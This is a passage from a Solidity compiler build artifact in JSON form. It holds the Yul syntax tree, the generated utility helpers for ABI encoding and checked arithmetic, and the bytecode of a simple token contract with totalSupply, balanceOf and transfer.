																		"nodeType": "YulFunctionCall",
																		"src": "902:53:2"
																	},
																	"variableNames": [
																		{
																			"name": "value1",
																			"nodeType": "YulIdentifier",
																			"src": "892:6:2"
																		}
																	]
																}
															]
														}
													]
												},
												"name": "abi_decode_tuple_t_addresst_uint256",
												"nodeType": "YulFunctionDefinition",
												"parameters": [
													{
														"name": "headStart",
														"nodeType": "YulTypedName",
														"src": "610:9:2",
														"type": ""
													},
													{
														"name": "dataEnd",
														"nodeType": "YulTypedName",
														"src": "621:7:2",
														"type": ""
													}
												],
												"returnVariables": [
													{
														"name": "value0",
														"nodeType": "YulTypedName",
														"src": "633:6:2",
														"type": ""
													},
													{
														"name": "value1",
														"nodeType": "YulTypedName",
														"src": "641:6:2",
														"type": ""
													}
												],
												"src": "565:407:2"
											},
											{
												"body": {
													"nodeType": "YulBlock",
													"src": "1037:50:2",
													"statements": [
														{
															"expression": {
																"arguments": [
																	{
																		"name": "pos",
																		"nodeType": "YulIdentifier",
																		"src": "1054:3:2"
																	},
																	{
																		"arguments": [
																			{
																				"name": "value",
																				"nodeType": "YulIdentifier",
																				"src": "1074:5:2"
																			}
																		],
																		"functionName": {
																			"name": "cleanup_t_bool",
																			"nodeType": "YulIdentifier",
																			"src": "1059:14:2"
																		},
																		"nodeType": "YulFunctionCall",
																		"src": "1059:21:2"
																	}
																],
																"functionName": {
																	"name": "mstore",
																	"nodeType": "YulIdentifier",
																	"src": "1047:6:2"
																},
																"nodeType": "YulFunctionCall",
																"src": "1047:34:2"
															},
															"nodeType": "YulExpressionStatement",
															"src": "1047:34:2"
														}
													]
												},
												"name": "abi_encode_t_bool_to_t_bool_fromStack",
												"nodeType": "YulFunctionDefinition",
												"parameters": [
													{
														"name": "value",
														"nodeType": "YulTypedName",
														"src": "1025:5:2",
														"type": ""
													},
													{
														"name": "pos",
														"nodeType": "YulTypedName",
														"src": "1032:3:2",
														"type": ""
													}
												],
												"src": "978:109:2"
											},
											{
												"body": {
													"nodeType": "YulBlock",
													"src": "1158:53:2",
													"statements": [
														{
															"expression": {
																"arguments": [
																	{
																		"name": "pos",
																		"nodeType": "YulIdentifier",
																		"src": "1175:3:2"
																	},
																	{
																		"arguments": [
																			{
																				"name": "value",
																				"nodeType": "YulIdentifier",
																				"src": "1198:5:2"
																			}
																		],
																		"functionName": {
																			"name": "cleanup_t_uint256",
																			"nodeType": "YulIdentifier",
																			"src": "1180:17:2"
																		},
																		"nodeType": "YulFunctionCall",
																		"src": "1180:24:2"
																	}
																],
																"functionName": {
																	"name": "mstore",
																	"nodeType": "YulIdentifier",
																	"src": "1168:6:2"
																},
																"nodeType": "YulFunctionCall",
																"src": "1168:37:2"
															},
															"nodeType": "YulExpressionStatement",
															"src": "1168:37:2"
														}
													]
												},
												"name": "abi_encode_t_uint256_to_t_uint256_fromStack",
												"nodeType": "YulFunctionDefinition",
												"parameters": [
													{
														"name": "value",
														"nodeType": "YulTypedName",
														"src": "1146:5:2",
														"type": ""
													},
													{
														"name": "pos",
														"nodeType": "YulTypedName",
														"src": "1153:3:2",
														"type": ""
													}
												],
												"src": "1093:118:2"
											},
											{
												"body": {
													"nodeType": "YulBlock",
													"src": "1309:118:2",
													"statements": [
														{
															"nodeType": "YulAssignment",
															"src": "1319:26:2",
															"value": {
																"arguments": [
																	{
																		"name": "headStart",
																		"nodeType": "YulIdentifier",
																		"src": "1331:9:2"
																	},
																	{
																		"kind": "number",
																		"nodeType": "YulLiteral",
																		"src": "1342:2:2",
																		"type": "",
																		"value": "32"
																	}
																],
																"functionName": {
																	"name": "add",
																	"nodeType": "YulIdentifier",
																	"src": "1327:3:2"
																},
																"nodeType": "YulFunctionCall",
																"src": "1327:18:2"
															},
															"variableNames": [
																{
																	"name": "tail",
																	"nodeType": "YulIdentifier",
																	"src": "1319:4:2"
																}
															]
														},
														{
															"expression": {
																"arguments": [
																	{
																		"name": "value0",
																		"nodeType": "YulIdentifier",
																		"src": "1393:6:2"
																	},
																	{
																		"arguments": [
																			{
																				"name": "headStart",
																				"nodeType": "YulIdentifier",
																				"src": "1406:9:2"
																			},
																			{
																				"kind": "number",
																				"nodeType": "YulLiteral",
																				"src": "1417:1:2",
																				"type": "",
																				"value": "0"
																			}
																		],
																		"functionName": {
																			"name": "add",
																			"nodeType": "YulIdentifier",
																			"src": "1402:3:2"
																		},
																		"nodeType": "YulFunctionCall",
																		"src": "1402:17:2"
																	}
																],
																"functionName": {
																	"name": "abi_encode_t_bool_to_t_bool_fromStack",
																	"nodeType": "YulIdentifier",
																	"src": "1355:37:2"
																},
																"nodeType": "YulFunctionCall",
																"src": "1355:65:2"
															},
															"nodeType": "YulExpressionStatement",
															"src": "1355:65:2"
														}
													]
												},
												"name": "abi_encode_tuple_t_bool__to_t_bool__fromStack_reversed",
												"nodeType": "YulFunctionDefinition",
												"parameters": [
													{
														"name": "headStart",
														"nodeType": "YulTypedName",
														"src": "1281:9:2",
														"type": ""
													},
													{
														"name": "value0",
														"nodeType": "YulTypedName",
														"src": "1293:6:2",
														"type": ""
													}
												],
												"returnVariables": [
													{
														"name": "tail",
														"nodeType": "YulTypedName",
														"src": "1304:4:2",
														"type": ""
													}
												],
												"src": "1217:210:2"
											},
											{
												"body": {
													"nodeType": "YulBlock",
													"src": "1531:124:2",
													"statements": [
														{
															"nodeType": "YulAssignment",
															"src": "1541:26:2",
															"value": {
																"arguments": [
																	{
																		"name": "headStart",
																		"nodeType": "YulIdentifier",
																		"src": "1553:9:2"
																	},
																	{
																		"kind": "number",
																		"nodeType": "YulLiteral",
																		"src": "1564:2:2",
																		"type": "",
																		"value": "32"
																	}
																],
																"functionName": {
																	"name": "add",
																	"nodeType": "YulIdentifier",
																	"src": "1549:3:2"
																},
																"nodeType": "YulFunctionCall",
																"src": "1549:18:2"
															},
															"variableNames": [
																{
																	"name": "tail",
																	"nodeType": "YulIdentifier",
																	"src": "1541:4:2"
																}
															]
														},
														{
															"expression": {
																"arguments": [
																	{
																		"name": "value0",
																		"nodeType": "YulIdentifier",
																		"src": "1621:6:2"
																	},
																	{
																		"arguments": [
																			{
																				"name": "headStart",
																				"nodeType": "YulIdentifier",
																				"src": "1634:9:2"
																			},
																			{
																				"kind": "number",
																				"nodeType": "YulLiteral",
																				"src": "1645:1:2",
																				"type": "",
																				"value": "0"
																			}
																		],
																		"functionName": {
																			"name": "add",
																			"nodeType": "YulIdentifier",
																			"src": "1630:3:2"
																		},
																		"nodeType": "YulFunctionCall",
																		"src": "1630:17:2"
																	}
																],
																"functionName": {
																	"name": "abi_encode_t_uint256_to_t_uint256_fromStack",
																	"nodeType": "YulIdentifier",
																	"src": "1577:43:2"
																},
																"nodeType": "YulFunctionCall",
																"src": "1577:71:2"
															},
															"nodeType": "YulExpressionStatement",
															"src": "1577:71:2"
														}
													]
												},
												"name": "abi_encode_tuple_t_uint256__to_t_uint256__fromStack_reversed",
												"nodeType": "YulFunctionDefinition",
												"parameters": [
													{
														"name": "headStart",
														"nodeType": "YulTypedName",
														"src": "1503:9:2",
														"type": ""
													},
													{
														"name": "value0",
														"nodeType": "YulTypedName",
														"src": "1515:6:2",
														"type": ""
													}
												],
												"returnVariables": [
													{
														"name": "tail",
														"nodeType": "YulTypedName",
														"src": "1526:4:2",
														"type": ""
													}
												],
												"src": "1433:222:2"
											},
											{
												"body": {
													"nodeType": "YulBlock",
													"src": "1705:261:2",
													"statements": [
														{
															"nodeType": "YulAssignment",
															"src": "1715:25:2",
															"value": {
																"arguments": [
																	{
																		"name": "x",
																		"nodeType": "YulIdentifier",
																		"src": "1738:1:2"
																	}
																],
																"functionName": {
																	"name": "cleanup_t_uint256",
																	"nodeType": "YulIdentifier",
																	"src": "1720:17:2"
																},
																"nodeType": "YulFunctionCall",
																"src": "1720:20:2"
															},
															"variableNames": [
																{
																	"name": "x",
																	"nodeType": "YulIdentifier",
																	"src": "1715:1:2"
																}
															]
														},
														{
															"nodeType": "YulAssignment",
															"src": "1749:25:2",
															"value": {
																"arguments": [
																	{
																		"name": "y",
																		"nodeType": "YulIdentifier",
																		"src": "1772:1:2"
																	}
																],
																"functionName": {
																	"name": "cleanup_t_uint256",
																	"nodeType": "YulIdentifier",
																	"src": "1754:17:2"
																},
																"nodeType": "YulFunctionCall",
																"src": "1754:20:2"
															},
															"variableNames": [
																{
																	"name": "y",
																	"nodeType": "YulIdentifier",
																	"src": "1749:1:2"
																}
															]
														},
														{
															"body": {
																"nodeType": "YulBlock",
																"src": "1912:22:2",
																"statements": [
																	{
																		"expression": {
																			"arguments": [],
																			"functionName": {
																				"name": "panic_error_0x11",
																				"nodeType": "YulIdentifier",
																				"src": "1914:16:2"
																			},
																			"nodeType": "YulFunctionCall",
																			"src": "1914:18:2"
																		},
																		"nodeType": "YulExpressionStatement",
																		"src": "1914:18:2"
																	}
																]
															},
															"condition": {
																"arguments": [
																	{
																		"name": "x",
																		"nodeType": "YulIdentifier",
																		"src": "1833:1:2"
																	},
																	{
																		"arguments": [
																			{
																				"kind": "number",
																				"nodeType": "YulLiteral",
																				"src": "1840:66:2",
																				"type": "",
																				"value": "0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff"
																			},
																			{
																				"name": "y",
																				"nodeType": "YulIdentifier",
																				"src": "1908:1:2"
																			}
																		],
																		"functionName": {
																			"name": "sub",
																			"nodeType": "YulIdentifier",
																			"src": "1836:3:2"
																		},
																		"nodeType": "YulFunctionCall",
																		"src": "1836:74:2"
																	}
																],
																"functionName": {
																	"name": "gt",
																	"nodeType": "YulIdentifier",
																	"src": "1830:2:2"
																},
																"nodeType": "YulFunctionCall",
																"src": "1830:81:2"
															},
															"nodeType": "YulIf",
															"src": "1827:2:2"
														},
														{
															"nodeType": "YulAssignment",
															"src": "1944:16:2",
															"value": {
																"arguments": [
																	{
																		"name": "x",
																		"nodeType": "YulIdentifier",
																		"src": "1955:1:2"
																	},
																	{
																		"name": "y",
																		"nodeType": "YulIdentifier",
																		"src": "1958:1:2"
																	}
																],
																"functionName": {
																	"name": "add",
																	"nodeType": "YulIdentifier",
																	"src": "1951:3:2"
																},
																"nodeType": "YulFunctionCall",
																"src": "1951:9:2"
															},
															"variableNames": [
																{
																	"name": "sum",
																	"nodeType": "YulIdentifier",
																	"src": "1944:3:2"
																}
															]
														}
													]
												},
												"name": "checked_add_t_uint256",
												"nodeType": "YulFunctionDefinition",
												"parameters": [
													{
														"name": "x",
														"nodeType": "YulTypedName",
														"src": "1692:1:2",
														"type": ""
													},
													{
														"name": "y",
														"nodeType": "YulTypedName",
														"src": "1695:1:2",
														"type": ""
													}
												],
												"returnVariables": [
													{
														"name": "sum",
														"nodeType": "YulTypedName",
														"src": "1701:3:2",
														"type": ""
													}
												],
												"src": "1661:305:2"
											},
											{
												"body": {
													"nodeType": "YulBlock",
													"src": "2017:146:2",
													"statements": [
														{
															"nodeType": "YulAssignment",
															"src": "2027:25:2",
															"value": {
																"arguments": [
																	{
																		"name": "x",
																		"nodeType": "YulIdentifier",
																		"src": "2050:1:2"
																	}
																],
																"functionName": {
																	"name": "cleanup_t_uint256",
																	"nodeType": "YulIdentifier",
																	"src": "2032:17:2"
																},
																"nodeType": "YulFunctionCall",
																"src": "2032:20:2"
															},
															"variableNames": [
																{
																	"name": "x",
																	"nodeType": "YulIdentifier",
																	"src": "2027:1:2"
																}
															]
														},
														{
															"nodeType": "YulAssignment",
															"src": "2061:25:2",
															"value": {
																"arguments": [
																	{
																		"name": "y",
																		"nodeType": "YulIdentifier",
																		"src": "2084:1:2"
																	}
																],
																"functionName": {
																	"name": "cleanup_t_uint256",
																	"nodeType": "YulIdentifier",
																	"src": "2066:17:2"
																},
																"nodeType": "YulFunctionCall",
																"src": "2066:20:2"
															},
															"variableNames": [
																{
																	"name": "y",
																	"nodeType": "YulIdentifier",
																	"src": "2061:1:2"
																}
															]
														},
														{
															"body": {
																"nodeType": "YulBlock",
																"src": "2108:22:2",
																"statements": [
																	{
																		"expression": {
																			"arguments": [],
																			"functionName": {
																				"name": "panic_error_0x11",
																				"nodeType": "YulIdentifier",
																				"src": "2110:16:2"
																			},
																			"nodeType": "YulFunctionCall",
																			"src": "2110:18:2"
																		},
																		"nodeType": "YulExpressionStatement",
																		"src": "2110:18:2"
																	}
																]
															},
															"condition": {
																"arguments": [
																	{
																		"name": "x",
																		"nodeType": "YulIdentifier",
																		"src": "2102:1:2"
																	},
																	{
																		"name": "y",
																		"nodeType": "YulIdentifier",
																		"src": "2105:1:2"
																	}
																],
																"functionName": {
																	"name": "lt",
																	"nodeType": "YulIdentifier",
																	"src": "2099:2:2"
																},
																"nodeType": "YulFunctionCall",
																"src": "2099:8:2"
															},
															"nodeType": "YulIf",
															"src": "2096:2:2"
														},
														{
															"nodeType": "YulAssignment",
															"src": "2140:17:2",
															"value": {
																"arguments": [
																	{
																		"name": "x",
																		"nodeType": "YulIdentifier",
																		"src": "2152:1:2"
																	},
																	{
																		"name": "y",
																		"nodeType": "YulIdentifier",
																		"src": "2155:1:2"
																	}
																],
																"functionName": {
																	"name": "sub",
																	"nodeType": "YulIdentifier",
																	"src": "2148:3:2"
																},
																"nodeType": "YulFunctionCall",
																"src": "2148:9:2"
															},
															"variableNames": [
																{
																	"name": "diff",
																	"nodeType": "YulIdentifier",
																	"src": "2140:4:2"
																}
															]
														}
													]
												},
												"name": "checked_sub_t_uint256",
												"nodeType": "YulFunctionDefinition",
												"parameters": [
													{
														"name": "x",
														"nodeType": "YulTypedName",
														"src": "2003:1:2",
														"type": ""
													},
													{
														"name": "y",
														"nodeType": "YulTypedName",
														"src": "2006:1:2",
														"type": ""
													}
												],
												"returnVariables": [
													{
														"name": "diff",
														"nodeType": "YulTypedName",
														"src": "2012:4:2",
														"type": ""
													}
												],
												"src": "1972:191:2"
											},
											{
												"body": {
													"nodeType": "YulBlock",
													"src": "2214:51:2",
													"statements": [
														{
															"nodeType": "YulAssignment",
															"src": "2224:35:2",
															"value": {
																"arguments": [
																	{
																		"name": "value",
																		"nodeType": "YulIdentifier",
																		"src": "2253:5:2"
																	}
																],
																"functionName": {
																	"name": "cleanup_t_uint160",
																	"nodeType": "YulIdentifier",
																	"src": "2235:17:2"
																},
																"nodeType": "YulFunctionCall",
																"src": "2235:24:2"
															},
															"variableNames": [
																{
																	"name": "cleaned",
																	"nodeType": "YulIdentifier",
																	"src": "2224:7:2"
																}
															]
														}
													]
												},
												"name": "cleanup_t_address",
												"nodeType": "YulFunctionDefinition",
												"parameters": [
													{
														"name": "value",
														"nodeType": "YulTypedName",
														"src": "2196:5:2",
														"type": ""
													}
												],
												"returnVariables": [
													{
														"name": "cleaned",
														"nodeType": "YulTypedName",
														"src": "2206:7:2",
														"type": ""
													}
												],
												"src": "2169:96:2"
											},
											{
												"body": {
													"nodeType": "YulBlock",
													"src": "2313:48:2",
													"statements": [
														{
															"nodeType": "YulAssignment",
															"src": "2323:32:2",
															"value": {
																"arguments": [
																	{
																		"arguments": [
																			{
																				"name": "value",
																				"nodeType": "YulIdentifier",
																				"src": "2348:5:2"
																			}
																		],
																		"functionName": {
																			"name": "iszero",
																			"nodeType": "YulIdentifier",
																			"src": "2341:6:2"
																		},
																		"nodeType": "YulFunctionCall",
																		"src": "2341:13:2"
																	}
																],
																"functionName": {
																	"name": "iszero",
																	"nodeType": "YulIdentifier",
																	"src": "2334:6:2"
																},
																"nodeType": "YulFunctionCall",
																"src": "2334:21:2"
															},
															"variableNames": [
																{
																	"name": "cleaned",
																	"nodeType": "YulIdentifier",
																	"src": "2323:7:2"
																}
															]
														}
													]
												},
												"name": "cleanup_t_bool",
												"nodeType": "YulFunctionDefinition",
												"parameters": [
													{
														"name": "value",
														"nodeType": "YulTypedName",
														"src": "2295:5:2",
														"type": ""
													}
												],
												"returnVariables": [
													{
														"name": "cleaned",
														"nodeType": "YulTypedName",
														"src": "2305:7:2",
														"type": ""
													}
												],
												"src": "2271:90:2"
											},
											{
												"body": {
													"nodeType": "YulBlock",
													"src": "2412:81:2",
													"statements": [
														{
															"nodeType": "YulAssignment",
															"src": "2422:65:2",
															"value": {
																"arguments": [
																	{
																		"name": "value",
																		"nodeType": "YulIdentifier",
																		"src": "2437:5:2"
																	},
																	{
																		"kind": "number",
																		"nodeType": "YulLiteral",
																		"src": "2444:42:2",
																		"type": "",
																		"value": "0xffffffffffffffffffffffffffffffffffffffff"
																	}
																],
																"functionName": {
																	"name": "and",
																	"nodeType": "YulIdentifier",
																	"src": "2433:3:2"
																},
																"nodeType": "YulFunctionCall",
																"src": "2433:54:2"
															},
															"variableNames": [
																{
																	"name": "cleaned",
																	"nodeType": "YulIdentifier",
																	"src": "2422:7:2"
																}
															]
														}
													]
												},
												"name": "cleanup_t_uint160",
												"nodeType": "YulFunctionDefinition",
												"parameters": [
													{
														"name": "value",
														"nodeType": "YulTypedName",
														"src": "2394:5:2",
														"type": ""
													}
												],
												"returnVariables": [
													{
														"name": "cleaned",
														"nodeType": "YulTypedName",
														"src": "2404:7:2",
														"type": ""
													}
												],
												"src": "2367:126:2"
											},
											{
												"body": {
													"nodeType": "YulBlock",
													"src": "2544:32:2",
													"statements": [
														{
															"nodeType": "YulAssignment",
															"src": "2554:16:2",
															"value": {
																"name": "value",
																"nodeType": "YulIdentifier",
																"src": "2565:5:2"
															},
															"variableNames": [
																{
																	"name": "cleaned",
																	"nodeType": "YulIdentifier",
																	"src": "2554:7:2"
																}
															]
														}
													]
												},
												"name": "cleanup_t_uint256",
												"nodeType": "YulFunctionDefinition",
												"parameters": [
													{
														"name": "value",
														"nodeType": "YulTypedName",
														"src": "2526:5:2",
														"type": ""
													}
												],
												"returnVariables": [
													{
														"name": "cleaned",
														"nodeType": "YulTypedName",
														"src": "2536:7:2",
														"type": ""
													}
												],
												"src": "2499:77:2"
											},
											{
												"body": {
													"nodeType": "YulBlock",
													"src": "2610:152:2",
													"statements": [
														{
															"expression": {
																"arguments": [
																	{
																		"kind": "number",
																		"nodeType": "YulLiteral",
																		"src": "2627:1:2",
																		"type": "",
																		"value": "0"
																	},
																	{
																		"kind": "number",
																		"nodeType": "YulLiteral",
																		"src": "2630:77:2",
																		"type": "",
																		"value": "35408467139433450592217433187231851964531694900788300625387963629091585785856"
																	}
																],
																"functionName": {
																	"name": "mstore",
																	"nodeType": "YulIdentifier",
																	"src": "2620:6:2"
																},
																"nodeType": "YulFunctionCall",
																"src": "2620:88:2"
															},
															"nodeType": "YulExpressionStatement",
															"src": "2620:88:2"
														},
														{
															"expression": {
																"arguments": [
																	{
																		"kind": "number",
																		"nodeType": "YulLiteral",
																		"src": "2724:1:2",
																		"type": "",
																		"value": "4"
																	},
																	{
																		"kind": "number",
																		"nodeType": "YulLiteral",
																		"src": "2727:4:2",
																		"type": "",
																		"value": "0x11"
																	}
																],
																"functionName": {
																	"name": "mstore",
																	"nodeType": "YulIdentifier",
																	"src": "2717:6:2"
																},
																"nodeType": "YulFunctionCall",
																"src": "2717:15:2"
															},
															"nodeType": "YulExpressionStatement",
															"src": "2717:15:2"
														},
														{
															"expression": {
																"arguments": [
																	{
																		"kind": "number",
																		"nodeType": "YulLiteral",
																		"src": "2748:1:2",
																		"type": "",
																		"value": "0"
																	},
																	{
																		"kind": "number",
																		"nodeType": "YulLiteral",
																		"src": "2751:4:2",
																		"type": "",
																		"value": "0x24"
																	}
																],
																"functionName": {
																	"name": "revert",
																	"nodeType": "YulIdentifier",
																	"src": "2741:6:2"
																},
																"nodeType": "YulFunctionCall",
																"src": "2741:15:2"
															},
															"nodeType": "YulExpressionStatement",
															"src": "2741:15:2"
														}
													]
												},
												"name": "panic_error_0x11",
												"nodeType": "YulFunctionDefinition",
												"src": "2582:180:2"
											},
											{
												"body": {
													"nodeType": "YulBlock",
													"src": "2811:79:2",
													"statements": [
														{
															"body": {
																"nodeType": "YulBlock",
																"src": "2868:16:2",
																"statements": [
																	{
																		"expression": {
																			"arguments": [
																				{
																					"kind": "number",
																					"nodeType": "YulLiteral",
																					"src": "2877:1:2",
																					"type": "",
																					"value": "0"
																				},
																				{
																					"kind": "number",
																					"nodeType": "YulLiteral",
																					"src": "2880:1:2",
																					"type": "",
																					"value": "0"
																				}
																			],
																			"functionName": {
																				"name": "revert",
																				"nodeType": "YulIdentifier",
																				"src": "2870:6:2"
																			},
																			"nodeType": "YulFunctionCall",
																			"src": "2870:12:2"
																		},
																		"nodeType": "YulExpressionStatement",
																		"src": "2870:12:2"
																	}
																]
															},
															"condition": {
																"arguments": [
																	{
																		"arguments": [
																			{
																				"name": "value",
																				"nodeType": "YulIdentifier",
																				"src": "2834:5:2"
																			},
																			{
																				"arguments": [
																					{
																						"name": "value",
																						"nodeType": "YulIdentifier",
																						"src": "2859:5:2"
																					}
																				],
																				"functionName": {
																					"name": "cleanup_t_address",
																					"nodeType": "YulIdentifier",
																					"src": "2841:17:2"
																				},
																				"nodeType": "YulFunctionCall",
																				"src": "2841:24:2"
																			}
																		],
																		"functionName": {
																			"name": "eq",
																			"nodeType": "YulIdentifier",
																			"src": "2831:2:2"
																		},
																		"nodeType": "YulFunctionCall",
																		"src": "2831:35:2"
																	}
																],
																"functionName": {
																	"name": "iszero",
																	"nodeType": "YulIdentifier",
																	"src": "2824:6:2"
																},
																"nodeType": "YulFunctionCall",
																"src": "2824:43:2"
															},
															"nodeType": "YulIf",
															"src": "2821:2:2"
														}
													]
												},
												"name": "validator_revert_t_address",
												"nodeType": "YulFunctionDefinition",
												"parameters": [
													{
														"name": "value",
														"nodeType": "YulTypedName",
														"src": "2804:5:2",
														"type": ""
													}
												],
												"src": "2768:122:2"
											},
											{
												"body": {
													"nodeType": "YulBlock",
													"src": "2939:79:2",
													"statements": [
														{
															"body": {
																"nodeType": "YulBlock",
																"src": "2996:16:2",
																"statements": [
																	{
																		"expression": {
																			"arguments": [
																				{
																					"kind": "number",
																					"nodeType": "YulLiteral",
																					"src": "3005:1:2",
																					"type": "",
																					"value": "0"
																				},
																				{
																					"kind": "number",
																					"nodeType": "YulLiteral",
																					"src": "3008:1:2",
																					"type": "",
																					"value": "0"
																				}
																			],
																			"functionName": {
																				"name": "revert",
																				"nodeType": "YulIdentifier",
																				"src": "2998:6:2"
																			},
																			"nodeType": "YulFunctionCall",
																			"src": "2998:12:2"
																		},
																		"nodeType": "YulExpressionStatement",
																		"src": "2998:12:2"
																	}
																]
															},
															"condition": {
																"arguments": [
																	{
																		"arguments": [
																			{
																				"name": "value",
																				"nodeType": "YulIdentifier",
																				"src": "2962:5:2"
																			},
																			{
																				"arguments": [
																					{
																						"name": "value",
																						"nodeType": "YulIdentifier",
																						"src": "2987:5:2"
																					}
																				],
																				"functionName": {
																					"name": "cleanup_t_uint256",
																					"nodeType": "YulIdentifier",
																					"src": "2969:17:2"
																				},
																				"nodeType": "YulFunctionCall",
																				"src": "2969:24:2"
																			}
																		],
																		"functionName": {
																			"name": "eq",
																			"nodeType": "YulIdentifier",
																			"src": "2959:2:2"
																		},
																		"nodeType": "YulFunctionCall",
																		"src": "2959:35:2"
																	}
																],
																"functionName": {
																	"name": "iszero",
																	"nodeType": "YulIdentifier",
																	"src": "2952:6:2"
																},
																"nodeType": "YulFunctionCall",
																"src": "2952:43:2"
															},
															"nodeType": "YulIf",
															"src": "2949:2:2"
														}
													]
												},
												"name": "validator_revert_t_uint256",
												"nodeType": "YulFunctionDefinition",
												"parameters": [
													{
														"name": "value",
														"nodeType": "YulTypedName",
														"src": "2932:5:2",
														"type": ""
													}
												],
												"src": "2896:122:2"
											}
										]
									},
									"contents": "{\n\n    function abi_decode_t_address(offset, end) -> value {\n        value := calldataload(offset)\n        validator_revert_t_address(value)\n    }\n\n    function abi_decode_t_uint256(offset, end) -> value {\n        value := calldataload(offset)\n        validator_revert_t_uint256(value)\n    }\n\n    function abi_decode_tuple_t_address(headStart, dataEnd) -> value0 {\n        if slt(sub(dataEnd, headStart), 32) { revert(0, 0) }\n\n        {\n\n            let offset := 0\n\n            value0 := abi_decode_t_address(add(headStart, offset), dataEnd)\n        }\n\n    }\n\n    function abi_decode_tuple_t_addresst_uint256(headStart, dataEnd) -> value0, value1 {\n        if slt(sub(dataEnd, headStart), 64) { revert(0, 0) }\n\n        {\n\n            let offset := 0\n\n            value0 := abi_decode_t_address(add(headStart, offset), dataEnd)\n        }\n\n        {\n\n            let offset := 32\n\n            value1 := abi_decode_t_uint256(add(headStart, offset), dataEnd)\n        }\n\n    }\n\n    function abi_encode_t_bool_to_t_bool_fromStack(value, pos) {\n        mstore(pos, cleanup_t_bool(value))\n    }\n\n    function abi_encode_t_uint256_to_t_uint256_fromStack(value, pos) {\n        mstore(pos, cleanup_t_uint256(value))\n    }\n\n    function abi_encode_tuple_t_bool__to_t_bool__fromStack_reversed(headStart , value0) -> tail {\n        tail := add(headStart, 32)\n\n        abi_encode_t_bool_to_t_bool_fromStack(value0,  add(headStart, 0))\n\n    }\n\n    function abi_encode_tuple_t_uint256__to_t_uint256__fromStack_reversed(headStart , value0) -> tail {\n        tail := add(headStart, 32)\n\n        abi_encode_t_uint256_to_t_uint256_fromStack(value0,  add(headStart, 0))\n\n    }\n\n    function checked_add_t_uint256(x, y) -> sum {\n        x := cleanup_t_uint256(x)\n        y := cleanup_t_uint256(y)\n\n        // overflow, if x > (maxValue - y)\n        if gt(x, sub(0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff, y)) { panic_error_0x11() }\n\n        sum := add(x, y)\n    }\n\n    function checked_sub_t_uint256(x, y) -> diff {\n        x := cleanup_t_uint256(x)\n        y := cleanup_t_uint256(y)\n\n        if lt(x, y) { panic_error_0x11() }\n\n        diff := sub(x, y)\n    }\n\n    function cleanup_t_address(value) -> cleaned {\n        cleaned := cleanup_t_uint160(value)\n    }\n\n    function cleanup_t_bool(value) -> cleaned {\n        cleaned := iszero(iszero(value))\n    }\n\n    function cleanup_t_uint160(value) -> cleaned {\n        cleaned := and(value, 0xffffffffffffffffffffffffffffffffffffffff)\n    }\n\n    function cleanup_t_uint256(value) -> cleaned {\n        cleaned := value\n    }\n\n    function panic_error_0x11() {\n        mstore(0, 35408467139433450592217433187231851964531694900788300625387963629091585785856)\n        mstore(4, 0x11)\n        revert(0, 0x24)\n    }\n\n    function validator_revert_t_address(value) {\n        if iszero(eq(value, cleanup_t_address(value))) { revert(0, 0) }\n    }\n\n    function validator_revert_t_uint256(value) {\n        if iszero(eq(value, cleanup_t_uint256(value))) { revert(0, 0) }\n    }\n\n}\n",
									"id": 2,
									"language": "Yul",
									"name": "#utility.yul"
								}
							],
							"immutableReferences": {},
							"linkReferences": {},
							"object": "608060405234801561001057600080fd5b50600436106100415760003560e01c806318160ddd1461004657806370a0823114610064578063a9059cbb14610094575b600080fd5b61004e6100c4565b60405161005b91906102e6565b60405180910390f35b61007e60048036038101906100799190610248565b6100ca565b60405161008b91906102e6565b60405180910390f35b6100ae60048036038101906100a99190610271565b610112565b6040516100bb91906102cb565b60405180910390f35b60015481565b60008060008373ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff168152602001908152602001600020549050919050565b600080826000803373ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1681526020019081526020016000205461015f9190610357565b101561016a57600080fd5b816000803373ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002060008282546101b89190610357565b92505081905550816000808573ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff168152602001908152602001600020600082825461020d9190610301565b925050819055506001905092915050565b60008135905061022d81610402565b92915050565b60008135905061024281610419565b92915050565b60006020828403121561025a57600080fd5b60006102688482850161021e565b91505092915050565b6000806040838503121561028457600080fd5b60006102928582860161021e565b92505060206102a385828601610233565b9150509250929050565b6102b68161039d565b82525050565b6102c5816103c9565b82525050565b60006020820190506102e060008301846102ad565b92915050565b60006020820190506102fb60008301846102bc565b92915050565b600061030c826103c9565b9150610317836103c9565b9250827fffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff0382111561034c5761034b6103d3565b5b828201905092915050565b6000610362826103c9565b915061036d836103c9565b9250828210156103805761037f6103d3565b5b828203905092915050565b6000610396826103a9565b9050919050565b60008115159050919050565b600073ffffffffffffffffffffffffffffffffffffffff82169050919050565b6000819050919050565b7f4e487b7100000000000000000000000000000000000000000000000000000000600052601160045260246000fd5b61040b8161038b565b811461041657600080fd5b50565b610422816103c9565b811461042d57600080fd5b5056fea26469706673582212202c7a7a3b801135e796914b927415438ed61c53fb783151f063675b537975d11564736f6c63430008010033",
